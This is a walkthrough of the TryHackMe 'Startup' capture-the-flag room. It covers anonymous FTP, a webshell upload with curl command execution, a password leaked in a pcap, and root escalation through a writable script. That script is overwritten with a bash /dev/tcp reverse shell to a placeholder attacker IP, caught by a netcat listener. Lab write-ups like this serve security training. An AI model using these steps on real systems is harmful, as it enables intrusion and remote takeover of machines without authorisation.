# 🖥️ TryHackMe Walkthrough: Startup

> A short CTF-style room exploring enumeration, weak credentials, and privilege escalation via environment variables.

---

## 📍 Target Info

- **Hostname**: `startup.thm`
- **IP**: set via `/etc/hosts`
- **Open Ports**:
  - `21/tcp` - FTP (anonymous login allowed)
  - `22/tcp` - SSH
  - `80/tcp` - HTTP

---

## 🧭 Enumeration

### 🔎 Nmap Scan

```bash
nmap -sC -sV -Pn startup.thm -oN nmap_initial.txt
````

Discovered:

* FTP anonymous access
* Basic HTTP service
* SSH requires credentials

### 🌐 Web Enumeration

Found:

* `/files/ftp/` → accessible via web
* Upload via FTP reflects here

---

## 📂 FTP Access

```bash
ftp startup.thm
# Login: anonymous / <blank>
```

* Uploads allowed only in `/files/ftp/`
* Uploaded webshell `cmd.php`

---

## 🐚 Remote Code Execution

```bash
curl http://startup.thm/files/ftp/cmd.php?cmd=id
# uid=33(www-data)
```

* Established reverse shell with Netcat

---

## 🔍 Interesting File: PCAP

* Path: `/incidents/suspicious.pcapng`
* Analyzed using `tshark`:

```bash
tshark -r suspicious.pcapng -z follow,tcp,ascii,7
```

→ Revealed leaked password: `<REDACTED>`

---

## 🔐 SSH Access

```bash
ssh lennie@startup.thm
Password: <REDACTED>
```

* Logged in successfully
* Retrieved user flag: `<REDACTED>`

---

## ⬆️ Privilege Escalation

### Found Script:

```bash
/home/lennie/scripts/planner.sh
```

Contents:

```bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
```

→ `/etc/print.sh` was writable!

### Exploit Steps:

1. Overwrite `/etc/print.sh`:

   ```bash
   echo "bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1" > /etc/print.sh
   chmod +x /etc/print.sh
   ```

2. Start listener:

   ```bash
   nc -lvnp 4444
   ```

3. Trigger:

   ```bash
   LIST=test /home/lennie/scripts/planner.sh
   ```

✅ Shell as `root`
✅ Retrieved root flag: `<REDACTED>`

---

## 🏁 Flags

* **User Flag**: `<REDACTED>`
* **Root Flag**: `<REDACTED>`

---

## ✅ Key Takeaways

* `.pcap` files may leak credentials—always investigate
* FTP + Web = potential RCE
* Writable files in `root`-invoked scripts are critical escalation vectors

---

## 🏷️ Tags

`tryhackme` `ctf` `startup` `ftp` `webshell` `pcap` `linux` `reverse-shell` `env-privesc`


